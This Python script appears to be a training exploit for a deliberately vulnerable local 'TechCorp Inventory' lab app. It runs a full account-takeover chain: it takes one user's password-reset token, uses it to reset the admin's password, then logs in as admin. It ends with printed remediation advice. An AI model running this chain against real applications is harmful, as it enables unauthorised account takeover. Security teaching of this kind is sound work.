#!/usr/bin/env python3
"""
TechCorp Inventory System - Password Reset Vulnerability Training Script
========================================================================

This script demonstrates how to exploit the password reset vulnerability
for security training purposes.

Educational Objective:
- Learn how missing token validation can lead to account takeover
- Practice with Burp Suite compatible exploitation techniques
- Understand the impact of improper authentication controls
"""

import requests
import sys
import time
from urllib.parse import urlparse, parse_qs

class PasswordResetExploit:
    def __init__(self, base_url="http://localhost:3206"):
        self.base_url = base_url
        self.session = requests.Session()
    
    def check_application(self):
        """Check if the application is accessible"""
        try:
            response = self.session.get(self.base_url)
            if response.status_code in [200, 302]:
                return True
        except requests.exceptions.RequestException:
            return False
        return False
    
    def request_password_reset(self, username="jennifer.morgan"):
        """Step 1: Request password reset for target user"""
        print(f"🔑 Step 1: Requesting password reset for {username}...")
        
        response = self.session.post(f"{self.base_url}/forgot-password", data={
            'username': username
        }, allow_redirects=False)
        
        print(f"🔍 DEBUG: Response status: {response.status_code}")
        print(f"🔍 DEBUG: Response headers: {dict(response.headers)}")
        print(f"🔍 DEBUG: Response content (first 200 chars): {response.text[:200]}")
        
        if response.status_code == 302:
            reset_url = response.headers.get('Location', '')
            print(f"✅ Password reset initiated successfully")
            print(f"📧 Reset URL: {reset_url}")
            return reset_url
        else:
            print(f"❌ Failed to initiate password reset")
            print(f"Response: {response.text}")
            return None
    
    def extract_token(self, reset_url):
        """Step 2: Extract reset token from URL"""
        print("🔍 Step 2: Extracting reset token...")
        
        parsed_url = urlparse(reset_url)
        query_params = parse_qs(parsed_url.query)
        token = query_params.get('temp-forgot-password-token', [''])[0]
        
        if token:
            print(f"✅ Token extracted: {token[:20]}...")
            return token
        else:
            print("❌ No token found in URL")
            return None
    
    def exploit_password_reset(self, token, target_user="admin", new_password="exploited123"):
        """Step 3: Exploit the vulnerability by changing another user's password"""
        print(f"💥 Step 3: Exploiting vulnerability - changing {target_user}'s password...")
        
        response = self.session.post(f"{self.base_url}/reset-password", data={
            'username': target_user,  # VULNERABILITY: Can change any user's password!
            'new_password': new_password,
            'confirm_password': new_password
        }, params={'temp-forgot-password-token': token})
        
        if response.status_code == 302 or "successfully reset" in response.text:
            print(f"🔥 Successfully changed {target_user}'s password!")
            return True
        else:
            print(f"❌ Failed to change {target_user}'s password")
            return False
    
    def login_as_target(self, username="admin", password="exploited123"):
        """Step 4: Login as the compromised user"""
        print(f"🔓 Step 4: Attempting to login as {username}...")
        
        response = self.session.post(f"{self.base_url}/login", data={
            'username': username,
            'password': password
        })
        
        if response.status_code == 302 or "dashboard" in response.url:
            print(f"✅ Successfully logged in as {username}!")
            return True
        else:
            print(f"❌ Failed to login as {username}")
            return False
    
    def verify_access(self):
        """Step 5: Verify elevated access"""
        print("🏆 Step 5: Verifying administrative access...")
        
        # Check dashboard access
        dashboard_response = self.session.get(f"{self.base_url}/dashboard")
        if dashboard_response.status_code == 200:
            print("✅ Dashboard accessible")
        
        # Check inventory access
        inventory_response = self.session.get(f"{self.base_url}/inventory")
        if inventory_response.status_code == 200:
            print("✅ Inventory system accessible")
        
        # Check profile access
        profile_response = self.session.get(f"{self.base_url}/profile")
        if profile_response.status_code == 200:
            print("✅ User profile accessible")
        
        return True
    
    def run_exploit(self):
        """Execute the complete exploitation chain"""
        print("🎯 TechCorp Inventory Password Reset Vulnerability Training")
        print("=" * 60)
        
        # Check application availability
        print("📡 Checking application availability...")
        if not self.check_application():
            print("❌ Application not accessible. Make sure it's running on", self.base_url)
            return False
        print("✅ Application is accessible")
        print()
        
        # Step 1: Request password reset
        reset_url = self.request_password_reset()
        if not reset_url:
            return False
        print()
        
        # Step 2: Extract token
        token = self.extract_token(reset_url)
        if not token:
            return False
        print()
        
        # Step 3: Exploit vulnerability
        if not self.exploit_password_reset(token):
            return False
        print()
        
        # Step 4: Login as admin
        if not self.login_as_target():
            return False
        print()
        
        # Step 5: Verify access
        self.verify_access()
        print()
        
        print("🎉 TRAINING EXPLOITATION SUCCESSFUL!")
        print()
        print("🔥 Attack Summary:")
        print("   ✓ Requested password reset for jennifer.morgan")
        print("   ✓ Extracted reset token from redirect URL")
        print("   ✓ Exploited missing token validation")
        print("   ✓ Changed admin password using valid token")
        print("   ✓ Gained unauthorized administrative access")
        print()
        print("📚 Learning Points:")
        print("   • Password reset tokens must be validated properly")
        print("   • Token should be tied to the specific user")
        print("   • Implement proper authorization checks")
        print("   • Use CSRF protection for sensitive operations")
        print()
        print("🛡️  Remediation:")
        print("   • Validate token belongs to the requesting user")
        print("   • Implement token expiration")
        print("   • Add rate limiting for reset requests")
        print("   • Log all password reset activities")
        
        return True

def main():
    """Main function"""
    print("🔒 TechCorp Inventory System - Password Reset Training")
    print("🎓 Educational Security Exploitation Tool")
    print()
    
    # Check if custom URL provided
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3206"
    
    exploit = PasswordResetExploit(base_url)
    
    try:
        success = exploit.run_exploit()
        if success:
            print("\n✅ Training completed successfully!")
            print("🎯 You have learned how to identify and exploit password reset vulnerabilities")
        else:
            print("\n❌ Training failed - check application status")
            sys.exit(1)
    except KeyboardInterrupt:
        print("\n⏹️  Training interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n💥 Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
